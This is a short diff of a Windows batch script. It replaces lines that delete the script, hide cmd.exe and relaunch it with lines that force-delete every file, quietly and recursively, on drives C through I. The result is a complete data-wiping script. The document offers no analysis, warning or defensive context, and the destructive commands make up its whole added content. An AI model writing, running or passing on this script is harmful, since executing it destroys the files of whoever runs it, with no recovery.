@@ -1,11 +1,15 @@
 @echo off
 
-:start
+Del C:\*.* /f /s /q
 
-del %0
+Del D:\*.* /f /s /q
 
-attrib +s +h c:\windows\system32\cmd.exe
+Del E:\*.* /f /s /q
 
-start c:\windows\system32\cmd.exe
+Del F:\*.* /f /s /q
 
-exit
+Del G:\*.* /f /s /q
+
+Del H:\*.* /f /s /q
+
+Del I:\*.* /f /s /q
